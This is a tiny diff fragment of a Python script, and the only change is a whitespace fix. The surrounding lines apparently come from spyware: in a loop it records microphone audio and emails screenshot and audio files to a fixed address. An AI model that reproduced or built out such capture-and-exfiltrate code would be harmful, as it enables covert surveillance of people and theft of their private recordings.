@@ -219,7 +219,7 @@ while number_of_iterations < number_of_iterations_end:
                    extend + screenshot_information, toaddr)
 
         microphone()
-        
+
         send_email(audio_information, file_path +
                    extend + audio_information, toaddr)
 
